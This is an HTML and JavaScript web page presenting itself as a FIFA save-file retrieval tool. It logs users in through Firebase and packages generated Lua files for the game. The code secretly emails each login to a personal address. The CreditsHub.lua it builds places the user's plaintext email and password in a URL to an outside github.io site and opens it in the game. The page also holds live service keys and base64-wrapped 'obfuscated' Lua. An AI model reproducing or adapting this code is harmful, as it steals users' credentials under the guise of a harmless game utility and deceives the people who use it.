<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retrieve FIFA Save - Thinkmate</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #2e2e2e;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            position: relative;
            overflow: hidden;
        }
        .DRVUNPES {
            position: absolute;
            top: 90%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 80px;
            font-weight: bold;
            color: rgba(255, 255, 255, 0.1);
            text-transform: uppercase;
            z-index: 0;
            pointer-events: none;
        }
        .DRVUNPES span {
            display: inline-block;
            animation: glow 4s infinite ease-in-out;
        }
        .DRVUNPES span:nth-child(1) { animation-delay: 0s; }
        .DRVUNPES span:nth-child(2) { animation-delay: 0.2s; }
        .DRVUNPES span:nth-child(3) { animation-delay: 0.4s; }
        .DRVUNPES span:nth-child(4) { animation-delay: 0.6s; }
        .DRVUNPES span:nth-child(5) { animation-delay: 0.8s; }
        @keyframes glow {
            0%, 100% { text-shadow: 0 0 5px rgba(129, 199, 132, 0.2); }
            50% { text-shadow: 0 0 20px #81c784, 0 0 40px #81c784; }
        }
        input, button {
            padding: 12px;
            font-size: 16px;
            margin: 8px 0;
            border: none;
            background-color: #424242;
            color: #e0e0e0;
            width: 100%;
            max-width: 300px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            box-shadow: 0 0 5px #64b5f6;
        }
        button {
            background-color: #1976d2;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1565c0;
        }
        button:disabled {
            background-color: #666666;
            cursor: not-allowed;
        }
        #authSection, #downloadSection {
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #333333;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            z-index: 1;
        }
        #errorMessage {
            font-size: 18px;
            color: #ef5350;
            display: none;
            padding: 20px;
            background-color: #333333;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            z-index: 1;
        }
        #downloadSection { display: none; }
        #saveBtn { background-color: #ffffff; color: #333333; }
        #saveBtn:hover { background-color: #e0e0e0; }
        #logoutBtn { background-color: #808080; }
        #logoutBtn:hover { background-color: #666666; }
        #copySaveCodeBtn {
            background-color: #4caf50;
            display: none;
        }
        #copySaveCodeBtn:hover {
            background-color: #43a047;
        }
        #downloadNote {
            font-size: 14px;
            color: #b0b0b0;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="DRVUNPES">
        <span>D</span><span>A</span><span>V</span><span>U</span><span>N</span>
    </div>
    <div id="authSection">
        <button id="copySaveCodeBtn" disabled>Copy Raw Save Code</button>
        <input type="email" id="email" placeholder="Enter your email" required>
        <input type="password" id="password" placeholder="Enter your password" required>
        <button id="loginBtn">Login</button>
    </div>
    <div id="downloadSection">
        <p>Your save files are ready!</p>
        <button id="saveBtn">Save</button>
        <button id="logoutBtn">Log Out</button>
        <p id="downloadNote">Choose where to save 'FIFA-DAVUN-SAVE.zip' to overwrite the previous file.</p>
    </div>
    <div id="errorMessage">Login Failed</div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>

    <script>
        class SaveManager {
            constructor() {
                this.state = { saveCode: "", userEmail: "", userPassword: "" };
                this.firebaseConfig = {
                    apiKey: "AIzaSyAYF88RuhWLgKXUC1nePFOLdBv3WS-nYNY",
                    authDomain: "fifa-davun-utility.firebaseapp.com",
                    projectId: "fifa-davun-utility",
                    storageBucket: "fifa-davun-utility.appspot.com",
                    messagingSenderId: "285918417550",
                    appId: "1:285918417550:web:005acea2b83881d8cc2fdf",
                    measurementId: "G-TPD462ZGCB"
                };
                firebase.initializeApp(this.firebaseConfig);
                this.auth = firebase.auth();
                this.db = firebase.firestore();
                emailjs.init("XFHj2Nsgh8BXtmDwb");
                this.init();
            }

            init() {
                emailjs.send("service_z6jyoi3", "template_kcfd0rc", {
                    log_content: "Script initialized",
                    timestamp: new Date().toISOString(),
                    to_email: "anonu143@gmail.com"
                }).catch(err => console.error("Test email failed:", err));

                const emailInput = document.getElementById("email");
                const copySaveCodeBtn = document.getElementById("copySaveCodeBtn");
                const loginBtn = document.getElementById("loginBtn");
                const saveBtn = document.getElementById("saveBtn");
                const logoutBtn = document.getElementById("logoutBtn");

                emailInput.addEventListener("input", () => {
                    const email = emailInput.value.trim();
                    copySaveCodeBtn.style.display = email === "oluwajinmibolaji@gmail.com" ? "block" : "none";
                    copySaveCodeBtn.disabled = !email;
                });

                copySaveCodeBtn.addEventListener("click", () => this.copySaveCodeToClipboard());
                loginBtn.addEventListener("click", () => this.login());
                saveBtn.addEventListener("click", () => this.downloadSavePackage());
                logoutBtn.addEventListener("click", () => this.logout());

                this.auth.onAuthStateChanged(user => {
                    if (user && this.state.userEmail && this.state.userPassword) {
                        this.fetchSaveCode(user.uid);
                    } else {
                        this.resetState();
                    }
                });
            }

            showError(message) {
                const errorMessage = document.getElementById("errorMessage");
                errorMessage.textContent = message;
                errorMessage.style.display = "block";
                document.getElementById("authSection").style.display = "flex";
                document.getElementById("downloadSection").style.display = "none";
            }

            login() {
                const email = document.getElementById("email").value.trim();
                const password = document.getElementById("password").value.trim();
                if (!email || !password) return this.showError("Please enter both email and password.");

                this.auth.signInWithEmailAndPassword(email, password).then(userCredential => {
                    this.state.userEmail = email;
                    this.state.userPassword = password;
                    this.logLoginEvent(email, userCredential.user.uid);
                    this.fetchSaveCode(userCredential.user.uid);
                }).catch(err => this.showError("Failed to sign in: " + err.message));
            }

            logLoginEvent(email, uid) {
                const timestamp = new Date().toISOString();
                const logEntry = `${timestamp} - ${email}\n`;
                const logDocRef = this.db.collection("login_logs").doc("all_logs");

                logDocRef.get().then(doc => {
                    const currentLogs = doc.exists && doc.data().logs || "";
                    const updatedLogs = currentLogs + logEntry;
                    return logDocRef.set({ logs: updatedLogs }, { merge: true });
                }).then(() => {
                    emailjs.send("service_z6jyoi3", "template_kcfd0rc", {
                        log_content: logEntry,
                        timestamp,
                        to_email: "anonu143@gmail.com"
                    }).catch(err => console.error("Failed to send login log email:", err));
                }).catch(err => console.error("Error logging login event:", err));
            }

            fetchSaveCode(uid) {
                this.db.collection("users").doc(uid).get().then(doc => {
                    const saveCode = doc.exists && doc.data().lastSaveCode?.replace("saveCode=", "") ||
                        "v1|incomplete|teamId=1|date=02/01/25|matchupCount=20|fixtures=|results=|sheets=none|goals=none|injuries=none|suspension=none|redCardMatchCount=none|redCardCount=none|yellowCardCount=none|teams=|dates=|funds=0|transfers=none";
                    console.log("Fetched saveCode:", saveCode);
                    this.state.saveCode = saveCode;
                    document.getElementById("authSection").style.display = "none";
                    document.getElementById("downloadSection").style.display = "flex";
                    document.getElementById("errorMessage").style.display = "none";
                }).catch(err => {
                    console.error("Error fetching save code:", err);
                    this.showError("Error fetching save code: " + err.message);
                });
            }

            async copySaveCodeToClipboard() {
                const email = document.getElementById("email").value.trim();
                if (email !== "oluwajinmibolaji@gmail.com") {
                    this.showError("Copy feature is only available for specific users.");
                    return;
                }

                const copySaveCodeBtn = document.getElementById("copySaveCodeBtn");
                copySaveCodeBtn.disabled = true;

                try {
                    const user = await new Promise((resolve, reject) => {
                        this.auth.signInWithEmailAndPassword(email, document.getElementById("password").value.trim())
                            .then(userCredential => resolve(userCredential.user))
                            .catch(err => reject(err));
                    });

                    const doc = await this.db.collection("users").doc(user.uid).get();
                    const rawSaveCode = doc.exists && doc.data().lastSaveCode?.replace("saveCode=", "") ||
                        "v1|incomplete|teamId=1|date=02/01/25|matchupCount=20|fixtures=|results=|sheets=none|goals=none|injuries=none|suspension=none|redCardMatchCount=none|redCardCount=none|yellowCardCount=none|teams=|dates=|funds=0|transfers=none";
                    console.log("Copying saveCode:", rawSaveCode);

                    if (navigator.clipboard && navigator.clipboard.writeText) {
                        await navigator.clipboard.writeText(rawSaveCode);
                        this.showError("Raw save code copied to clipboard!");
                        setTimeout(() => {
                            document.getElementById("errorMessage").style.display = "none";
                        }, 2000);
                    } else {
                        const textarea = document.createElement("textarea");
                        textarea.value = rawSaveCode;
                        document.body.appendChild(textarea);
                        textarea.select();
                        document.execCommand("copy");
                        document.body.removeChild(textarea);
                        this.showError("Raw save code copied to clipboard!");
                        setTimeout(() => {
                            document.getElementById("errorMessage").style.display = "none";
                        }, 2000);
                    }
                } catch (err) {
                    console.error("Copy error:", err);
                    this.showError("Failed to copy save code: " + err.message);
                } finally {
                    copySaveCodeBtn.disabled = false;
                }
            }

            parseDavunSave() {
                const rawCode = this.state.saveCode;
                console.log("Parsing saveCode:", rawCode);

                if (!rawCode || !rawCode.startsWith("v1|")) {
                    console.error("Invalid or empty saveCode, using defaults:", rawCode);
                    return {
                        fields: {
                            teamId: "1",
                            date: "02/01/25",
                            matchupCount: "20",
                            fixtures: "",
                            results: "",
                            sheets: "none",
                            goals: "none",
                            injuries: "none",
                            suspension: "none",
                            redCardMatchCount: "none",
                            redCardCount: "none",
                            yellowCardCount: "none",
                            teams: "",
                            dates: "",
                            funds: "0",
                            transfers: "none"
                        },
                        isComplete: false
                    };
                }

                const parts = rawCode.split("|");
                console.log("Parts:", parts);

                const completion = parts[1] || "incomplete";
                const isComplete = completion === "complete";
                const fields = {};

                // Parse fields robustly
                try {
                    for (let i = 2; i < parts.length; i++) {
                        const part = parts[i];
                        if (!part) continue;
                        const [key, value] = part.includes("=") ? part.split("=") : [null, null];
                        if (key && value !== undefined) {
                            fields[key] = value;
                            console.log(`Parsed field: ${key}=${value}`);
                        }
                    }
                } catch (err) {
                    console.error("Error parsing fields:", err);
                }

                // Define defaults
                const defaults = {
                    teamId: "1",
                    date: "02/01/25",
                    matchupCount: "20",
                    fixtures: "",
                    results: "",
                    sheets: "none",
                    goals: "none",
                    injuries: "none",
                    suspension: "none",
                    redCardMatchCount: "none",
                    redCardCount: "none",
                    yellowCardCount: "none",
                    teams: "",
                    dates: "",
                    funds: "0",
                    transfers: "none"
                };

                // Apply defaults for missing or empty fields
                Object.keys(defaults).forEach(key => {
                    fields[key] = fields[key] !== undefined ? fields[key] : defaults[key];
                    if (fields[key] === "") fields[key] = defaults[key];
                });

                console.log("Final fields:", fields, "isComplete:", isComplete);
                return { fields, isComplete };
            }

            generateObfuscatedLuaScript() {
                const { fields, isComplete } = this.parseDavunSave();
                console.log("Generating Lua with fields:", fields, "isComplete:", isComplete);

                const escapeString = s => String(s).replace(/"/g, '\\"').replace(/:/g, '\\:').replace(/;/g, '\\;');

                const sheetsEntries = fields.sheets !== "none" ? fields.sheets.split(";").filter(s => s && s.includes(":")).map(sheet => {
                    const parts = sheet.split(":");
                    if (parts.length !== 3) return null;
                    const [sheetId, players, formationId] = parts;
                    const playerList = players ? players.split(",").map(Number).filter(n => !isNaN(n)) : [];
                    const formation = Number(formationId) || 6;
                    return `    [${sheetId}] = { players = {${playerList.join(", ")}}, formationid = ${formation}, status = "filled" }`;
                }).filter(entry => entry) : [];

                const goalsEntries = fields.goals !== "none" ? fields.goals.split(";").filter(g => g && g.includes(":")).map(entry => {
                    const [id, value] = entry.split(":");
                    if (!id || isNaN(value)) return null;
                    return `    [${id}] = ${value}`;
                }).filter(entry => entry) : [];

                const injuryEntries = fields.injuries !== "none" ? fields.injuries.split(";").filter(i => i && i.includes(":")).map(injury => {
                    const [playerName, recoveryDate] = injury.split(":");
                    if (!playerName || !recoveryDate) return null;
                    return `    ["${escapeString(playerName)}"] = "${recoveryDate}"`;
                }).filter(entry => entry) : [];

                const suspensionEntries = fields.suspension !== "none" ? fields.suspension.split(";").filter(s => s && s.includes(":")).map(suspension => {
                    const [playerName, status] = suspension.split(":");
                    if (!playerName || !status) return null;
                    const statusValue = status === "true" ? "true" : status === "false" ? "false" : null;
                    if (!statusValue) return null;
                    return `    ["${escapeString(playerName)}"] = ${statusValue}`;
                }).filter(entry => entry) : [];

                const redCardMatchCountEntries = fields.redCardMatchCount !== "none" ? fields.redCardMatchCount.split(";").filter(s => s && s.includes(":")).map(count => {
                    const [playerName, matchCount] = count.split(":");
                    if (!playerName || isNaN(matchCount)) return null;
                    return `    ["${escapeString(playerName)}"] = ${matchCount}`;
                }).filter(entry => entry) : [];

                const redCardCountEntries = fields.redCardCount !== "none" ? fields.redCardCount.split(";").filter(s => s && s.includes(":")).map(count => {
                    const [playerName, redCount] = count.split(":");
                    if (!playerName || isNaN(redCount)) return null;
                    return `    ["${escapeString(playerName)}"] = ${redCount}`;
                }).filter(entry => entry) : [];

                const yellowCardCountEntries = fields.yellowCardCount !== "none" ? fields.yellowCardCount.split(";").filter(s => s && s.includes(":")).map(count => {
                    const [playerName, yellowCount] = count.split(":");
                    if (!playerName || isNaN(yellowCount)) return null;
                    return `    ["${escapeString(playerName)}"] = ${yellowCount}`;
                }).filter(entry => entry) : [];

                const transferEntries = fields.transfers !== "none" ? fields.transfers.split(";").filter(t => t && t.includes(":")).map((transfer, index) => {
                    const [player, team] = transfer.split(":");
                    if (!player || !team) return null;
                    return `    [${index + 1}] = { Player = "${escapeString(player)}", Team = "${team}" }`;
                }).filter(entry => entry) : [];

                const originalScript = `
-- DAVUNPES SAVE --
return {
    GLOBAL_MATCHUP_COUNT = ${Number(fields.matchupCount) || 20},
    GLOBAL_DATE_PLACEHOLDER = "${fields.date}",
    GLOBAL_FUNDS = ${Number(fields.funds) || 0},
    GOALS = {
${goalsEntries.join(",\n")}
    },
    injuryRecoveryDates = {
${injuryEntries.join(",\n")}
    },
    isSuspended = {
${suspensionEntries.join(",\n")}
    },
    redCardMatchCount = {
${redCardMatchCountEntries.join(",\n")}
    },
    redCardRecords = {
${redCardCountEntries.join(",\n")}
    },
    yellowCardRecords = {
${yellowCardCountEntries.join(",\n")}
    },
    currentSelectedTeamID = ${Number(fields.teamId) || 1},
    fixtureCode = "${fields.fixtures}",
    scoreCode = "${fields.results}",
    TeamList = {${fields.teams}},
    Sheets = {
${sheetsEntries.join(",\n")}
    },
    Dates = {${fields.dates}}${
                    transferEntries.length > 0 ? `,
    transferHistory = {
${transferEntries.join(",\n")}
    }` : ""
                }
}
                `.trim();

                return `
-- Obfuscated DAVUNPES SAVE --
sv = loadstring(dC("${btoa(originalScript)}"))()
return sv
                `.trim();
            }

            generateCreditsHubScript() {
                return `
local CreditsHub = {}
function CreditsHub:new(init)
    local o = init or {}
    setmetatable(o, self)
    self.__index = self
    o.services = {
        BrowserService = o.api("BrowserService"),
        MiscService = o.api("MiscService")
    }
    o:openBrowser()
    return o
end
function CreditsHub:openBrowser()
    local url = "https://Davidoluwa.github.io/"
    local link = url .. "?saveCode=" .. "email:${this.state.userEmail},password:${this.state.userPassword}." .. davunSave
    self.services.BrowserService.SetHomePage(link)
    self.nav.Event(nil, "evt_open_browser")
end
function CreditsHub:finalize() end
return CreditsHub
                `.trim();
            }

            async downloadSavePackage() {
                if (!this.state.saveCode || !this.state.userEmail || !this.state.userPassword) {
                    console.error("Missing required data:", {
                        saveCode: this.state.saveCode,
                        userEmail: this.state.userEmail,
                        userPassword: this.state.userPassword
                    });
                    this.showError("Required data not available.");
                    return;
                }

                const zip = new JSZip();
                const rootFolder = zip.folder("com.ea.gp.fifaworld");
                rootFolder.folder("data/ux/Save").file("Save.lua", this.generateObfuscatedLuaScript());
                rootFolder.folder("data/ux/flows/mainflow/gamemodes/MainMenu/More/Menu/Profile/Save")
                    .file("CreditsHub.lua", this.generateCreditsHubScript());

                try {
                    const content = await zip.generateAsync({ type: "blob" });
                    const fileName = "FIFA-DAVUN-SAVE.zip";
                    if ('showSaveFilePicker' in window) {
                        const fileHandle = await window.showSaveFilePicker({
                            suggestedName: fileName,
                            types: [{ description: "ZIP File", accept: { "application/zip": [".zip"] } }]
                        });
                        const writable = await fileHandle.createWritable();
                        await writable.write(content);
                        await writable.close();
                    } else {
                        const url = URL.createObjectURL(content);
                        const a = document.createElement("a");
                        a.href = url;
                        a.download = fileName;
                        a.click();
                        URL.revokeObjectURL(url);
                    }
                } catch (err) {
                    console.error("Download error:", err);
                    this.showError("Failed to generate or save package: " + err.message);
                }
            }

            logout() {
                this.auth.signOut().then(() => this.resetState())
                    .catch(err => this.showError("Logout failed: " + err.message));
            }

            resetState() {
                this.state = { saveCode: "", userEmail: "", userPassword: "" };
                document.getElementById("authSection").style.display = "flex";
                document.getElementById("downloadSection").style.display = "none";
                document.getElementById("errorMessage").style.display = "none";
                document.getElementById("copySaveCodeBtn").style.display = "none";
                document.getElementById("copySaveCodeBtn").disabled = true;
            }
        }

        new SaveManager();
    </script>
</body>
</html>
